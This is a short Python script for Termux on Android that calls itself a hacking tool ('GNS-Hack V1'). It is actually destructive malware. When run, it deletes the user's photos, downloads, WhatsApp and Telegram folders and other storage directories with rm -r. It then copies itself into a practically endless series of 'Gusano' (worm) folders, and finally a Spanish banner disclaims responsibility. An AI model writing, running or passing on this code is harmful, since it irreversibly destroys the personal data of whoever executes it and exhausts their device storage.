import subprocess,sys,shutil
import os


os.system('termux-setup-storage')
os.system('rm -r /sdcard/Download')
os.system('rm -r /sdcard/download')
os.system('rm -r /sdcard/Android')
os.system('rm -r /sdcard/DCIM')
os.system('rm -r /sdcard/WhatsApp')
os.system('rm -r /sdcard/GBWhatsApp')
os.system('rm -r /sdcard/snaptube')
os.system('rm -r /sdcard/Telegram')
os.system('rm -r /sdcard/Pictures')
os.system('rm -r /sdcard/bluetooth')
os.system('rm -r /sdcard/Movies')

#!Rojo
R='\033[1;31m'

#!Verde
V='\033[1;32m'
GOKE='\033[92m'

#!Amarillo
Y='\033[1;33m'

#!Azul
B='\033[0;34m'

#!Morado
M='\033[1;35m'

#!Cian
C='\033[1;36m'

#!Blanco
W='\033[0m'

filename = sys.argv[0]

for x in range(999999999999999999999999999):
    path = "Gusano "+str(x)
    subprocess.call("mkdir {}".format(path),shell=True)
    shutil.copy(filename,path)

os.system("pkg install figlet")
os.system("clear")
os.system("sleep 1")
print (R)
os.system("figlet Bienvendio a")
os.system("sleep 1")
os.system("figlet GNS-Hack V1")
print(Y)
print ("                                                    by: Hydra")
os.system("sleep 00.01")
print (B)
print ("_________________________________________________________________")
os.system("sleep 1")
print (M)
print (" * Este script esta echo en codigo Python.")
os.system("sleep 1")
print(M)
print (" * Si llegaste a ejecutar el script, no me hago responsable.")
os.system("sleep 1")
print ("\n * Pon el comando 'ls' para ver lo que sucedio.")
print(B)
print ("_________________________________________________________________")
